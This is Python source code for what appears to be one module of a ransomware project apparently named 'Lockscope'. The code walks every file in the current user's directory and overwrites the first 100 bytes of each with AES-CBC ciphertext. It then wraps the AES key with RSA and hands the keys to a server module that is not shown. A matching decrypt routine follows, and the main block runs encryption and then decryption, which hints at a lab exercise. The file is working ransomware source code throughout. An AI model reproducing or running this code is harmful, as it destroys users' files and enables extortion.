
import Server
import Asymmetric
import Walk_files

from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


class AEScipher:

    # Initialization of variables
    def __init__(self): 
        self.block_size = 32
        self.key_path = r"C:\Lockscope\Fase 4\key.pkl"
        self.size_bytes_path = r"C:\Lockscope\Fase 4\size_bytes.txt"
        self.iv_path = r"C:\Lockscope\Fase 4\iv.txt"
        self.private_key_path =  r"C:\Lockscope\Fase 4\private_key.pem"
        

    # Generate the AES key
    def generate_aes_key(self):
        aes_key = Random.new().read(self.block_size)
        
        return aes_key

    # Open the plain file and read data
    def open_file(self, path):
        try:
            with open(path, "rb") as f:
                f.seek(100)
                rest_content = f.read()
        
            with open(path, "rb") as f:
                cipher_data = f.read(100)

        except PermissionError:
            cipher_data = b""
            rest_content = b""
    
        return cipher_data, rest_content

    # Funtion to encrypt the data with AES key
    def encrypt(self):

        content = []
        aes_key = self.generate_aes_key()
        iv = get_random_bytes(16)

        with open(self.iv_path, "wb") as iv_file:
            iv_file.write(iv)

        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        
        for path in Walk_files.find_files(Walk_files.username()):
            cipher_data, rest_content = self.open_file(path)

            cipher_content = pad(cipher_data, self.block_size)
            encrypted_data = cipher.encrypt(cipher_content)

            with open(self.size_bytes_path, "w") as content_size:
                content_size.write(str(len(encrypted_data)))

            concat_bytes = encrypted_data + rest_content

            try:
                with open(path, "wb") as encrypted_file:
                    encrypted_file.write(concat_bytes)
            except PermissionError:
                print ("Error")
            except OSError:
                print ("Error")

            concat_bytes = b'\x00'
            encrypted_data = b'\x00'
            cipher_content = b'\x00'
            cipher_data = b'\x00'
            rest_content = b'\x00'

        public_key, private_key = Asymmetric.generate_rsa_keys()
        cipher_aes_key = Asymmetric.encrypt_aes_key(aes_key, public_key)

        Server.client(cipher_aes_key,public_key,private_key)
        Server.receiver()


    # Open the cipher file and read data
    def open_file_encrypted(self, path):

        with open(self.size_bytes_path, "r") as content_size:
            size_encrypted_data = int(content_size.read())

        try:
            with open(path, "rb") as f:
                f.seek(size_encrypted_data)
                rest_content = f.read()
            
            with open(path, "rb") as f:
                cipher_data = f.read(size_encrypted_data)
        except PermissionError:
            cipher_data = b""
            rest_content = b""
        
        return cipher_data, rest_content
    
    # Funtion to decrypt the data with AES key
    def decrypt(self):

        with open(self.private_key_path, "rb") as private_key_file:
            private_key = private_key_file.read()
        
        with open(self.key_path, "rb") as key_file:
            cipher_aes_key = key_file.read()
        
        aes_key = Asymmetric.decrypt_aes_key(cipher_aes_key,private_key)

        with open(self.iv_path, "rb") as iv_file:
            iv = iv_file.read()

        cipher = AES.new(aes_key, AES.MODE_CBC, iv)

        for path in Walk_files.find_files(Walk_files.username()):
            
            cipher_data, rest_content = self.open_file_encrypted(path)
            file_bytes_decrypted = cipher.decrypt(cipher_data)
            decrypted_data = unpad(file_bytes_decrypted, self.block_size)
            concat_bytes_decrypted = decrypted_data + rest_content

            try:
                with open(path, "wb") as plain_file:
                    plain_file.write(concat_bytes_decrypted)
            except PermissionError:
                print("Error")
            except OSError:
                print ("Error")
        
            file_bytes_decrypted = b'\x00'
            decrypted_data = b'\x00'
            concat_bytes_decrypted = b'\x00'
            cipher_data = b'\x00'
            rest_content = b'\x00'
        

if __name__ == '__main__':
    cipher = AEScipher()
    try:
        cipher.encrypt()
        cipher.decrypt()

    except KeyboardInterrupt:
        exit(1)
    

    
